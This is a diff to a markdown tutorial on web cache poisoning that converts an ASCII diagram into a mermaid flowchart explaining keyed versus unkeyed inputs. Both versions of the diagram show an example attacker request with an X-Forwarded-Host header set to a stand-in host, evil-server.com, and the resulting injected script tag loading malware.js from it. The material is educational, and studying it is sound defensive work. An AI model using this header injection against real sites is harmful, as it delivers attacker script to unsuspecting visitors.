@@ -24,36 +24,20 @@ If a backend application uses an *Unkeyed Input* to dynamically generate the HTM
 Think of it like a coat check at a club. The coat check attendant (Cache) gives you a ticket based *only* on your name (The Cache Key). They don't care what color shirt you are wearing (Unkeyed Input). You hand them a coat with a ticking bomb inside, wearing a red shirt. They label it "John's Coat". Later, a normal guy named John comes to the desk wearing a blue shirt. The attendant looks at the name, ignores the shirt color, and hands normal John the ticking bomb.
 
 ## ASCII Diagram
-```text
-================================================================================
-                    CACHE KEYS AND UNKEYED INPUTS
-================================================================================
+```mermaid
+flowchart TD
+    Attacker["Attacker's Request <br/> GET /index.html HTTP/1.1 (KEYED) <br/> Host: target.com (KEYED) <br/> X-Forwarded-Host: evil-server.com (UNKEYED - Ignored by Cache!)"]
+    Cache1["Cache Key Generation <br/> Cache says: 'The key is: /index.html + target.com. Do I have this? No.' <br/> (Forwards request to Backend)."]
+    Back["Backend Processing <br/> Backend says: 'I see X-Forwarded-Host. I will dynamically generate a script tag.' <br/> Response: &lt;script src='http://evil-server.com/malware.js'&gt;&lt;/script&gt;"]
+    Cache2["Cache Storage <br/> Cache says: 'I will save this response under the key: /index.html + target.com'"]
+    Victim["Victim's Request <br/> GET /index.html HTTP/1.1 (KEYED) <br/> Host: target.com (KEYED) <br/> (No evil header here)"]
+    Cache3["Cache Delivery <br/> Cache says: 'The key is: /index.html + target.com. I HAVE THIS IN STORAGE!' <br/> (Returns the saved HTML containing the evil script tag. Victim is hacked)."]
 
-[Attacker's Request]
-GET /index.html HTTP/1.1               <-- KEYED
-Host: target.com                       <-- KEYED
-X-Forwarded-Host: evil-server.com      <-- UNKEYED (Ignored by Cache!)
-
-[Cache Key Generation]
-Cache says: "The key is: /index.html + target.com. Do I have this? No."
-(Forwards request to Backend).
-
-[Backend Processing]
-Backend says: "I see X-Forwarded-Host. I will dynamically generate a script tag."
-Response: <script src="http://evil-server.com/malware.js"></script>
-
-[Cache Storage]
-Cache says: "I will save this response under the key: /index.html + target.com"
-
-[Victim's Request]
-GET /index.html HTTP/1.1               <-- KEYED
-Host: target.com                       <-- KEYED
-(No evil header here)
-
-[Cache Delivery]
-Cache says: "The key is: /index.html + target.com. I HAVE THIS IN STORAGE!"
-(Returns the saved HTML containing the evil script tag. Victim is hacked).
-================================================================================
+    Attacker --> Cache1
+    Cache1 --> Back
+    Back --> Cache2
+    Victim --> Cache3
+    Cache2 -.-> Cache3
 ```
 
 ## How to Find It
